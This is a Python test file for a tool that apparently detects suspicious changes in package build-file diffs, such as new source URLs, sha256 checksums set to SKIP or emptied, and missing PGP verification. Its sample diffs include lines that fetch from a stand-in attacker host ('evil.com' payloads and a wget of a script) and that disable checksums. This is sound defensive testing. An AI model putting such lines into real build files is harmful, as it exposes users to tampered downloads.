from trustsight.differ import detect_checksum_changes, detect_verification_evidence, extract_urls_from_diff


# --- URL extraction ---

def test_extract_urls_added_single():
    diff = """+source=("https://evil.com/payload.tar.gz")
+md5sums=("SKIP")
-https://old.com/source.tar.gz"""
    result = extract_urls_from_diff(diff)
    assert "https://evil.com/payload.tar.gz" in result.added_urls
    assert "https://old.com/source.tar.gz" in result.removed_urls


def test_extract_urls_no_http():
    diff = """+pkgver=1.0
+pkgrel=1"""
    result = extract_urls_from_diff(diff)
    assert result.added_urls == []
    assert result.removed_urls == []


def test_extract_urls_multiple_added():
    diff = """+source=("https://mirror1.com/a.tar.gz" "https://mirror2.com/b.tar.gz")
+noarch=('any')"""
    result = extract_urls_from_diff(diff)
    assert "https://mirror1.com/a.tar.gz" in result.added_urls
    assert "https://mirror2.com/b.tar.gz" in result.added_urls


def test_extract_urls_from_array():
    diff = """+source=(
+  "https://example.com/primary.tar.gz"
+  "https://backup.com/mirror.tar.gz"
+)"""
    result = extract_urls_from_diff(diff)
    assert "https://example.com/primary.tar.gz" in result.added_urls
    assert "https://backup.com/mirror.tar.gz" in result.added_urls


def test_extract_urls_removed_only():
    diff = """-source=("https://old-domain.com/pkg.tar.gz")"""
    result = extract_urls_from_diff(diff)
    assert result.added_urls == []
    assert "https://old-domain.com/pkg.tar.gz" in result.removed_urls


def test_extract_urls_added_and_removed():
    diff = """-  "https://old.com/v1.tar.gz"
+  "https://new.com/v2.tar.gz\""""
    result = extract_urls_from_diff(diff)
    assert "https://new.com/v2.tar.gz" in result.added_urls
    assert "https://old.com/v1.tar.gz" in result.removed_urls


def test_extract_urls_ignores_comments():
    diff = """+# https://example.com/not-a-real-url
+echo hello"""
    result = extract_urls_from_diff(diff)
    assert "https://example.com/not-a-real-url" in result.added_urls  # still extracted from + line


def test_extract_urls_with_variable_interpolation():
    diff = """+_pkgurl="https://example.com/$pkgname-$pkgver.tar.gz\""""
    result = extract_urls_from_diff(diff)
    assert "https://example.com/" in result.added_urls[0]


def test_extract_urls_wget_style():
    diff = """+  wget https://evil.com/script.sh"""
    result = extract_urls_from_diff(diff)
    assert "https://evil.com/script.sh" in result.added_urls


def test_extract_urls_changed_hostname_typo_squat():
    diff = """-source=("https://github.com/trusted/project.tar.gz")
+source=("https://github.com/trusted-project.tar.gz")"""
    result = extract_urls_from_diff(diff)
    assert len(result.added_urls) == 1
    assert "github.com" in result.added_urls[0]


# --- Checksum detection ---

def test_detect_checksum_skip():
    diff = """+sha256sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_checksum_skip_no_quotes():
    diff = """+sha256sums=(SKIP)"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_checksum_emptied():
    diff = """+sha256sums=()"""
    result = detect_checksum_changes(diff)
    assert result == "checksum_array_emptied"


def test_detect_checksum_unchanged():
    diff = """+pkgver=2.0"""
    result = detect_checksum_changes(diff)
    assert result == "unchanged"


def test_detect_checksum_added():
    diff = """+sha256sums=('abc123def456...')"""
    result = detect_checksum_changes(diff)
    assert result == "checksum_added_or_changed"


def test_detect_checksum_md5_not_flagged():
    diff = """+md5sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "unchanged"  # only sha256 is checked


def test_detect_checksum_none():
    diff = """+sha256sums=('NONE')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_checksum_skip_uppercase():
    diff = """+sha256sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


def test_detect_no_false_positive_on_source():
    diff = """+source=("https://example.com/sha256sums.txt")"""
    result = detect_checksum_changes(diff)
    assert result == "unchanged"


def test_detect_checksum_removal_in_context():
    diff = """-sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
+sha256sums=()"""
    result = detect_checksum_changes(diff)
    assert result == "checksum_array_emptied"


def test_detect_checksum_multiline():
    diff = """+sha256sums=('SKIP')"""
    result = detect_checksum_changes(diff)
    assert result == "changed_from_sha256_to_skip"


# --- Verification evidence ---

def test_detect_verification_checksum_present():
    diff = """+sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')"""
    ev = detect_verification_evidence(diff, checksum_behavior="checksum_added_or_changed")
    assert "checksum_present" in ev


def test_detect_verification_validpgpkeys():
    diff = """+validpgpkeys=('A1B2C3D4E5F6A7B8')"""
    ev = detect_verification_evidence(diff)
    assert "validpgpkeys_declared" in ev


def test_detect_verification_gpg_verify():
    diff = """+  gpg --verify signature.sig"""
    ev = detect_verification_evidence(diff)
    assert "gpg_verify_present" in ev


def test_detect_verification_no_evidence():
    ev = detect_verification_evidence("", checksum_behavior="unchanged")
    assert ev == []


def test_detect_verification_skip_not_evidence():
    """SKIP checksum is NOT verification evidence — it's the opposite."""
    ev = detect_verification_evidence(
        "+sha256sums=('SKIP')",
        checksum_behavior="changed_from_sha256_to_skip",
    )
    assert "checksum_present" not in ev
